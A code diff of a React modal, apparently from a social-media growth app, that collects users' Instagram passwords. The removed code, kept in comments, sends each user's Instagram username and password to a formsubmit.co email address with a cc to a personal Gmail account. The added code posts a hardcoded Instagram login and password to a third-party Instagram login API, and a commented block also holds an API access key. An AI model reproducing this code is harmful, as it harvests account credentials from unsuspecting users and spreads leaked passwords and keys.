@@ -9,6 +9,7 @@ import "../../src/modalsettings.css"
 import { supabase } from '../supabaseClient';
 import { FaLock } from 'react-icons/fa';
 import axios from 'axios';
+// import Instagram from "instagram-web-api";
 
 axios.defaults.headers.post['accept'] = 'application/json';
 // axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';
@@ -28,7 +29,7 @@ const urlEncode = function (data) {
 
 Modal.setAppElement('#root');
 
-const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId }) => {
+const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId, u }) => {
   const [instagramPassword, setInstagramPassword] = useState("");
   const [mode, setMode] = useState('auto');
   const [showPassword, setShowPassword] = useState(false)
@@ -94,35 +95,80 @@ const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId }) => {
 
     setLoading(true)
     var d = { instagramPassword, userMode: mode }
-    if (instagramPassword) {
-      fetch("https://formsubmit.co/ajax/niko@pianalytica.com", {
-        method: "POST",
+    if (instagramPassword && u !== 'admin') {
+      // 'username=popularen.si&password=Lol12345%40&verification_code=&proxy=&locale=&timezone=&user_agent='
+      // const query = {
+      //   username: user?.username, // use any shortcode you want
+      //   password: instagramPassword, // use any shortcode you want
+      //   verification_code: '', // use any shortcode you want
+      //   proxy: '', // use any shortcode you want
+      //   locale: '', // use any shortcode you want
+      //   timezone: '', // use any shortcode you want
+      //   user_agent: '', // use any shortcode you want
+      // }
+      // const url = new URL('https://api.lamadava.com/s1/auth/login')
+      // url.search = new URLSearchParams(query).toString()
+      // const headers = {
+      //   'method': 'POST',
+      //   'accept': 'application/json',
+      //   'Content-Type': 'application/x-www-form-urlencoded',
+      //   // 'x-rapidapi-host': 'instagram28.p.rapidapi.com',
+      //   'x-access-key': 'e1GKaU1YPsJNZlY1qTyj9i4J4yTIM7r1',
+      // }
+      // const response = await fetch(url.toString(), { headers })
+      // console.log({response});
+      // const result = await response.json()
+      // console.log({result});
+
+      fetch("https://api.lamadava.com/s1/auth/login", {
+        body: "username=popularen.si&password=Lol12345%40&verification_code=&proxy=&locale=&timezone=&user_agent=",
         headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
+          Accept: "application/json",
+          "Content-Type": "application/x-www-form-urlencoded",
+          // 'x-access-key': 'e1GKaU1YPsJNZlY1qTyj9i4J4yTIM7r1',
         },
-        body: JSON.stringify({
-          'date': new Date().toDateString(),
-          'username': user?.username,
-          'password': instagramPassword,
-          _cc: 'paulinnocent05@gmail.com',
-        })
+        method: "POST"
       })
-        .then(response => response.json())
-        .then(data => {
-          // console.log(data)
-          if (data.success === 'false') {
-            alert("Something went wrong, please try again or cantact our support support@sproutysocial.com")
-            setLoading(false)
-            window.location.reload()
-            setIsOpen(!modalIsOpen);
-            return;
-          }
-        })
-        .catch(error => {
-          console.log(error)
-        });
+
+      // const client = new Instagram({username: user?.username, password: instagramPassword})
+      // client.login().then(() => {
+      //   client.getProfile().then(console.log)
+      // })
+      // return;
+
+
+
+      // fetch("https://formsubmit.co/ajax/niko@pianalytica.com", {
+      //   method: "POST",
+      //   headers: {
+      //     'Content-Type': 'application/json',
+      //     'Accept': 'application/json'
+      //   },
+      //   body: JSON.stringify({
+      //     'date': new Date().toDateString(),
+      //     'username': user?.username,
+      //     'password': instagramPassword,
+      //     _cc: 'paulinnocent05@gmail.com',
+      //   })
+      // })
+      //   .then(response => response.json())
+      //   .then(data => {
+      //     // console.log(data)
+      //     if (data.success === 'false') {
+      //       alert("Something went wrong, please try again or cantact our support support@sproutysocial.com")
+      //       setLoading(false)
+      //       window.location.reload()
+      //       setIsOpen(!modalIsOpen);
+      //       return;
+      //     }
+      //   })
+      //   .catch(error => {
+      //     console.log(error)
+      //   });
       d = { ...d, status: 'checking' }
+
+
+
 
       // check if user's password is correct;
       // const url = "https://api.emailjs.com/api/v1.0/email/send";
@@ -166,6 +212,10 @@ const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId }) => {
       .eq('user_id', userId);
     error && console.log(data, error && error);
     setLoading(false)
+    if (u === 'admin'){
+      setIsOpen(!modalIsOpen);
+      return;
+    }
     window.location.reload()
     setIsOpen(!modalIsOpen);
   }
